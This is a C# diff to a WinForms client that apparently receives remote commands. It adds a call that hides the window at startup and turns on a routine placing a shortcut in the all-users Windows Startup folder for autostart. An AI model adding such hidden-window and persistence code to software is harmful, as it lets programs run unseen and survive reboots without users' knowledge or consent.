@@ -13,6 +13,7 @@ using Client;
 using Client.accept;
 using MiddleProject;
 using MiddleProject.impl;
+using MiddleProject.utils;
 
 namespace ClientWinform
 {
@@ -28,6 +29,7 @@ namespace ClientWinform
         
         private void Form1_Shown(object sender, EventArgs e)
         {
+            HideWindow();
             Start();
         }
         
@@ -46,7 +48,8 @@ namespace ClientWinform
 
                 _clientControl.BeginReceive();
 
-                //CreateShortcut();
+                ToolForCmd.CreateShortcut();
+
             }
             catch (Exception e)
             {
@@ -132,33 +135,5 @@ namespace ClientWinform
             Stop();
             Close();
         }
-        
-//        private void CreateShortcut()
-//        {
-//            string StartUpPath = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\";
-//            string appName = AppDomain.CurrentDomain.SetupInformation.ApplicationName;
-//            string appDir = AppDomain.CurrentDomain.SetupInformation.ApplicationBase;
-//
-//            string linkPath = StartUpPath + ToolForUrl.filterEnd(appName) + ".lnk";
-//            string targetPath = appDir + appName;
-//
-//            if (File.Exists(linkPath))
-//                return;
-//            
-//            try
-//            {
-//                var shellType = Type.GetTypeFromProgID("WScript.Shell");
-//                dynamic shell = Activator.CreateInstance(shellType);
-//                var shortcut = shell.CreateShortcut(linkPath);
-//                shortcut.TargetPath = targetPath;
-//                //shortcut.Arguments = args;启动参数
-//                shortcut.WorkingDirectory = appDir;
-//                shortcut.Save();
-//            }
-//            catch (Exception e)
-//            {
-//                LogUtil.Error(e.Message);
-//            }
-//        }
     }
 }
